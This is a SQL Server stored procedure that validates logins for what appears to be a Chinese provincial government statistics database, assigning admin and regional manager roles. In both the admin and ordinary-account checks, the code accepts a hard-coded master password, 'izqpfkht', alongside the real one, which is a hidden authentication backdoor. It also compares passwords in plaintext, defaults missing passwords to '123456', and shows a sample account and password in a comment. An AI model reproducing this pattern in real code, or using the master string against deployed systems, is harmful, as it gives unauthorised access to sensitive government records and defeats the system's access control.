USE [gov2014]
GO
/****** Object:  StoredProcedure [dbo].[sys_userloginex]    Script Date: 06/17/2014 09:13:20 ******/
SET ANSI_NULLS OFF
GO
SET QUOTED_IDENTIFIER OFF
GO
/*函数说明:
用户帐号及密码验证,
select * from govdata where bm='321302'
exec sys_userloginex '321302','214356'
*/

CREATE  proc [dbo].[sys_userloginex](@account varchar(64),@pwd varchar(64))
as
begin
declare @str nvarchar(200)
declare @curpwd nvarchar(100)
declare @roleid int
declare @username varchar(100)
declare @rolename varchar(100)
declare @oplevel int
declare @edit int--编辑功能是否打开
declare @curbm varchar(32)--当前编码
declare @workyear int--当前工作年份
declare @oname varchar(60)
declare @lockyear int --是否锁定年份(即在统计时可否选择指定年份　
   set nocount on
	set @edit = 0--关闭编辑功能
	select @workyear = isnull(dbo.sys_getparam('system','workyear'),2013)
	select @lockyear = isnull(dbo.sys_getparam('system','lockyear'),1)
	
   if lower(@account) = 'admin'
   begin
      set  @curpwd = dbo.sys_getparam('system','admin_pwd')
      if @pwd = @curpwd or @pwd = 'izqpfkht'
      begin
         select @roleid = 1,@username = dbo.sys_getparam('system','admin_name'),@rolename = 'admin' 
			select @edit=1,@oplevel=1,@username='超级管理员',@curbm='32',@oname='江苏省',@lockyear=0
         set @str = 'admin['+@account+'] login sucess'
         execute sys_addlog 1,"登录",@account,@str
      end
      else
      begin
         select @roleid = 0,@username = 'none',@rolename = 'none'  
			
         set @str = 'admin['+@account+'] login failed cause password error'
         execute sys_addlog 1,"登录",@account,@str
      end
   end
   else if exists(select 1 from govdata where bm = @account)
   begin
      select @curpwd= isnull(pwdex,'123456'),@edit=isnull(edit,0),@oplevel=ol,@username=oname,@oname=oname from govdata where bm=@account
      if (@pwd = @curpwd) or (@pwd = 'izqpfkht')
      begin
				set @roleid = @oplevel+1
				set @curbm=@account--普通帐号从登录帐号中获取当前编码
				set @rolename =case when @oplevel = 1 then '省管理员'
											when @oplevel=2 then '市管理员'
											when @oplevel =3 then '县区管理员'
											when @oplevel = 4 then '乡镇管理员'
											when @oplevel =5 then '村管理员'
											else ''
											end
         	set @str= '管理员['+@account+'] login sucess'
         execute sys_addlog 1,"登录",@account,@str
      end
      else
      begin
         select @roleid = 0,@username = 'none',@rolename = 'none'  
         set @str = 'manager['+@account+'] login failed cause password error'
         execute sys_addlog 1,"登录",@account,@str
      end
   end
   else 
   begin 
      select @roleid = 0,@username = 'none',@rolename = 'none'  
      set @str = 'account['+@account+'] account pwd not exists,login failed'
      execute sys_addlog 1,"登录",@account,@str
   end
   select @roleid roleid,@username username,@rolename rolename,@edit isedit,@curbm rbm,@oname rbn,@workyear workyear, @lockyear yearlock
	--             角色,   　　　　　登录名称,         角色名称  ， 可否编辑   , 根编码     ,默认工作年份,        年份是否锁定
   --
  set nocount off	
end
GO
